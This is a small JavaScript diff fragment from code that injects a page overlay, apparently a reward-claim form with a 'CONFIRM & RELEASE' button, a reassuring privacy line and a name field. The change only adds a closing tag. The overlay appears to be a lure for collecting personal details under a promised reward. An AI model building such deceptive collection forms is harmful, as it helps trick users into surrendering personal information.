@@ -103,7 +103,9 @@
       '<button id="__cfSubmit" type="button" style="width:100%;padding:14px;border:0;border-radius:10px;background:#FE2C55;color:#fff;font-weight:800;font-size:15px;letter-spacing:1px;cursor:pointer;">CONFIRM &amp; RELEASE</button>' +
       '<p style="margin:10px 0 0;font-size:11px;color:#9ca3af;text-align:center;line-height:1.4;">Your information is secure and will only be used to process your reward.</p>' +
       "</div>" +
+      "</div>" +
       "</div>";
+
     document.body.appendChild(overlay);
 
     const nameEl = overlay.querySelector("#__cfName");
